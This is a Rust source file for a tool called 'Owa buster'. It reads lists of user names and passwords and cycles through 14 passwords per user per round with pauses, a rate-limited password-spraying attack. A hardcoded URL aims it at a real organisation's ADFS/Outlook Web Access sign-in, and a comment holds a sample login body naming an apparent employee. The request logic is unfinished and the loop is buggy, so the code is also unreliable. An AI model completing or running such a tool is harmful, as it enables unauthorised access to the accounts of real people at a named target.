use std::fs;
use std::{ iter, mem };
use std::io::BufReader;
use std::io::prelude::*;
use std::{thread, time};
use std::time::{Duration, SystemTime};
use clap::{App, AppSettings, Arg};
use futures::{stream, StreamExt};
use reqwest::Client;

trait IdentifyFirstLast: Iterator + Sized {
    fn identify_first_last(self) -> Iter<Self>;
}

impl<I> IdentifyFirstLast for I where I: Iterator {
    fn identify_first_last(self) -> Iter<Self> {
        Iter(true, self.peekable())
    }
}

struct Iter<I>(bool, iter::Peekable<I>) where I: Iterator;

impl<I> Iterator for Iter<I> where I: Iterator {
    type Item = (bool, bool, I::Item);

    fn next(&mut self) -> Option<Self::Item> {
        let first = mem::replace(&mut self.0, false);
        self.1.next().map(|e| (first, self.1.peek().is_none(), e))
    }
}

#[derive(Debug,Clone)]
struct User{
    username: String,
    time_stamp:  SystemTime,
    index_of_last_pass: i32
}
impl User {
    fn set_time_stamp(&mut self, new_time:SystemTime){
        self.time_stamp = new_time;
    }
    fn set_index (&mut self, new_index: i32){
        self.index_of_last_pass = new_index;
    }
}

pub fn initialize () -> App<'static, 'static>{
    let mut cli_args = App::new("Owa buster")
    .version("0.01")
    .author("xD") 
    .arg(Arg::with_name("users")
        .short("u")
        .required(true)
        .long("users")
        .value_name("FILE")
        .help("Set full path to file with user name in format user@domain.com")
        .takes_value(true))
    .arg(Arg::with_name("passwords")
        .short("p")    
        .required(true)
        .long("passwords")
        .value_name("FILE")
        .help("Set full path to file with passwords")
        .takes_value(true));

    cli_args
}

const URL: &str = "https://adfssp.socpoist.sk/adfs/ls?version=1.0&action=signin&realm=urn%3AAppProxy%3Acom&appRealm=99a97e1d-2ce9-e611-90f8-001dd8b71e41&returnUrl=https%3A%2F%2Fposta.socpoist.sk%2Fowa%2F&client-request-id=3823A81D-0B03-0000-EB0A-2438030BD801#path=/mail";

//UserName=ba-blasko_f%40socpoist.sk&Password=test_password&AuthMethod=FormsAuthentication
fn get_files () -> (Vec<User>, Vec<String>) {
    let cli_args = initialize().get_matches();
    let users_path = cli_args.value_of("users").unwrap();
    let passwords_path = cli_args.value_of("passwords").unwrap();

    let user_file = match fs::File::open(users_path){
        Err(why) => panic!("couldn't open {}", std::error::Error::to_string(&why)),
        Ok(file) => file,
    };
    let password_file = match fs::File::open(passwords_path){
        Err(why) => panic!("couldn't open {} ", std::error::Error::to_string(&why)),
        Ok(file) => file,
    };

    let users : Vec<_> = BufReader::new(user_file).lines().map(|l| l.expect("empty file")).map(|l| User{username:l, time_stamp: SystemTime::now(), index_of_last_pass: 0,}).collect();
    let passwords : Vec<_> = BufReader::new(password_file).lines().map(|l| l.expect("empty file")).collect();
    (users, passwords)
}

fn requester (client: &Client, users: &mut Vec<User>, passwords: Vec<String>){
    let finished  = users.last().unwrap().index_of_last_pass == passwords.len() as i32;
    let len_pass = passwords.len() as i32;
    while !finished {
        let start_time = SystemTime::now(); 
        
        for user in &mut *users {
            let mut count: i32 = 0;
            //print!("got here user: {} {:?} ", user.username, range);
            for i in user.index_of_last_pass..passwords.len() as i32{
                if count >= 14 {break};
                count += 1;
                println!("Trying user{} with password {} ", user.username, passwords[i as usize])
                
            }
            user.set_index(count);
        }
    thread::sleep(time::Duration::from_secs(2));
    }
}

#[tokio::main]
async fn main() {
    let ( mut users, passwords) = get_files();

    let client = Client::new();

    requester(&client,&mut users, passwords);


}
        